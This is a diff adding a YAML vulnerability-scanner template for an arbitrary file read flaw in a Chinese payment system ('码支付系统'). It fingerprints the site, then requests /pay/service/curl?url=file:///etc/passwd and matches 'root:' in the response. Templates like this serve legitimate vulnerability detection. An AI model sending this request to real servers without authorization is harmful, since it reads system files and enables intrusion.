@@ -1,0 +1,43 @@
+id: poc-yaml-code-payment-system-curl-anyfile-read
+info:
+  name: 码支付系统 curl 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    This template detects an arbitrary file read vulnerability in the 码支付系统 payment system.
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "码支付"
+
+  - raw:
+      - |
+        GET /pay/service/curl?url=file:///etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<"
